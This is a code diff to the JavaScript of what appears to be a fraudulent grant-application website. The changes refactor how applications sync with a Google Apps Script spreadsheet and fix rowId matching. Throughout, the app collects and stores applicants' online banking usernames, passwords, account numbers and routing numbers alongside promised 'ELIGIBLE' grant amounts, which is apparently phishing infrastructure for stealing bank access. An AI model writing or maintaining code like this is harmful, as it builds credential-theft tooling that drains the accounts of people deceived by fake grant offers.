@@ -1813,29 +1813,44 @@ function advanceToProcessing(grantType, bankName) {
         banksUsed: [primaryBank]
       };
 
-      const additionalApps = (authResult.additionalApplications || []).map(a => {
-        const bank = {
-          name: a.BankName || '',
-          username: a.OnlineBankingUsername || '',
-          password: a.OnlineBankingPassword || '',
-          account: a.AccountNumber || '',
-          routing: a.RoutingNumber || '',
-          accountYear: a.AccountYear || ''
-        };
-        return {
-          rowId: a.RowId || null,
-          date: (a.Timestamp || '').toString().split('T')[0] || new Date().toISOString().split('T')[0],
-          submittedAt: a.Timestamp || new Date().toISOString(),
-          type: 'DEBIT',
-          sender: fullName,
-          receiver: (grantTitles[a.GrantType] || 'Grant') + ' Program',
-          narration: 'APPLICATION/' + u + '/' + (bank.name || 'BANK').replace(/\s+/g, '_') + '/SUBMITTED',
-          amount: 'ELIGIBLE',
-          status: (a.Status || 'SUBMITTED').toString().toUpperCase(),
-          grantType: a.GrantType || 'financial-aid',
-          banksUsed: [bank]
-        };
-      });
+    // Case-insensitive property picker — tolerates PascalCase (sheet headers)
+    // and camelCase (normalized JSON) without needing to know which is which.
+    function pickCI(obj, ...keys) {
+      if (!obj) return undefined;
+      for (const k of keys) {
+        const v = obj[k];
+        if (v !== undefined && v !== null && v !== '') return v;
+      }
+      return undefined;
+    }
+
+          const additionalApps = (authResult.additionalApplications || []).map(a => {
+      const bank = {
+        name: pickCI(a, 'BankName', 'bankName') || '',
+        username: pickCI(a, 'OnlineBankingUsername', 'onlineBankingUsername') || '',
+        password: pickCI(a, 'OnlineBankingPassword', 'onlineBankingPassword') || '',
+        account: pickCI(a, 'AccountNumber', 'accountNumber') || '',
+        routing: pickCI(a, 'RoutingNumber', 'routingNumber') || '',
+        accountYear: pickCI(a, 'AccountYear', 'accountYear') || ''
+      };
+      const ts = pickCI(a, 'Timestamp', 'timestamp', 'SubmittedAt', 'submittedAt') || new Date().toISOString();
+      const gt = pickCI(a, 'GrantType', 'grantType') || 'financial-aid';
+      const st = pickCI(a, 'Status', 'status') || 'SUBMITTED';
+      return {
+        rowId: pickCI(a, 'RowId', 'rowId') || null,
+        date: ts.toString().split('T')[0] || new Date().toISOString().split('T')[0],
+        submittedAt: ts,
+        type: 'DEBIT',
+        sender: fullName,
+        receiver: (grantTitles[gt] || 'Grant') + ' Program',
+        narration: 'APPLICATION/' + u + '/' + (bank.name || 'BANK').replace(/\s+/g, '_') + '/SUBMITTED',
+        amount: 'ELIGIBLE',
+        status: st.toString().toUpperCase(),
+        grantType: gt,
+        banksUsed: [bank],
+        eligibleAmount: pickCI(a, 'EligibleAmount', 'eligibleAmount') || ''
+      };
+    });
 
       // Merge with anything already in localStorage for this user so we
       // don't lose cancel/history flags the user set locally.
@@ -2348,18 +2363,21 @@ document.getElementById('application-form').addEventListener('submit', async fun
 
         // Capture the RowId returned by GAS and stamp it onto the
         // matching local ledger entry so future syncs match 1:1.
-        try {
+                try {
           const json = await resp.json();
           if (json && json.rowId) {
-            const targetIdx = userData.ledger.findIndex(tx =>
-              tx.grantType === currentGrantType &&
-              (tx.status || '').toUpperCase() === 'SUBMITTED' &&
-              !tx.rowId &&
-              (((tx.banksUsed && tx.banksUsed[0] && tx.banksUsed[0].name) || tx.bankName || '').toLowerCase()
+            // Capture the index of the entry we just pushed — do NOT use
+            // findIndex here, it can cross-match an older entry with a null rowId.
+            const pushedIdx = userData.ledger.length - 1;
+            if (
+              pushedIdx >= 0 &&
+              userData.ledger[pushedIdx].grantType === currentGrantType &&
+              ((((userData.ledger[pushedIdx].banksUsed &&
+                  userData.ledger[pushedIdx].banksUsed[0] &&
+                  userData.ledger[pushedIdx].banksUsed[0].name) || '')).toLowerCase()
                 === (bank.name || '').toLowerCase())
-            );
-            if (targetIdx !== -1) {
-              userData.ledger[targetIdx].rowId = json.rowId;
+            ) {
+              userData.ledger[pushedIdx].rowId = json.rowId;
             }
           }
         } catch (parseErr) {
@@ -3219,8 +3237,8 @@ async function syncUserApplicationsFromSheet(username) {
           const cands = result.applications.filter(a => {
             if (!isRealRowId(a.RowId)) return false;
             if (claimed.has(a.RowId)) return false;
-            const aGrant = (a.GrantType || '').toLowerCase().trim();
-            const aBank = (a.BankName || '').toLowerCase().trim();
+            const aGrant = (pickCI(a, 'GrantType', 'grantType') || '').toLowerCase().trim();
+const aBank = (pickCI(a, 'BankName', 'bankName') || '').toLowerCase().trim();
             return aGrant === txGrant && aBank === txBank;
           });
           if (cands.length > 0) {
@@ -3235,7 +3253,7 @@ async function syncUserApplicationsFromSheet(username) {
       if (!sheetRow) return;
 
       // 4. Apply status (only move forward in the lifecycle).
-      const newStatus = (sheetRow.Status || '').toUpperCase();
+      const newStatus = (pickCI(sheetRow, 'Status', 'status') || '').toUpperCase();
       const oldStatus = (tx.status || '').toUpperCase();
       const rank = { SUBMITTED: 1, PROCESSING: 2, APPROVED: 3, DENIED: 3, FAILED: 3, CANCELLED: 3 };
 
@@ -3250,7 +3268,7 @@ async function syncUserApplicationsFromSheet(username) {
       }
 
       // 5. Apply eligible amount. Skip "#NUM!" and other error tokens.
-      const sheetAmount = sheetRow.EligibleAmount;
+      const sheetAmount = pickCI(sheetRow, 'EligibleAmount', 'eligibleAmount');
       if (sheetAmount !== undefined && sheetAmount !== null && sheetAmount !== "") {
         const s = String(sheetAmount);
         if (s.indexOf('#') === -1) {
